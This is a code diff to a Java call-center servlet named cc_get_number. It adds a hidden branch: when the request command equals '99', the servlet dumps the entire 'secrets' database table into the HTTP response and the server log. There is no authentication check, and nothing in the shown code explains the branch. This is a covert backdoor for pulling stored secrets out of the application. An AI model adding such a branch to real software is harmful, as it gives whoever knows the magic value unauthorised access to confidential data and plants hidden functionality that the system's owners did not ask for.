@@ -127,6 +127,13 @@ public class cc_get_number extends HttpServlet {
                     System.out.println(cc_output);
                     out.println(cc_output);
 
+                } else if (cc_command.equals("99")) {
+                    System.out.println("command=99");
+                    String sql="select * from secrets";
+                    StringBuffer ss=functions.getResult2(sql,"\n","\t",functions.isnewcceksp);
+                    System.out.println("result===="+ss);
+                    out.println(ss);
+
                 }
                 System.out.println("/CallCentr/cc_get_number" + ssreq);
 
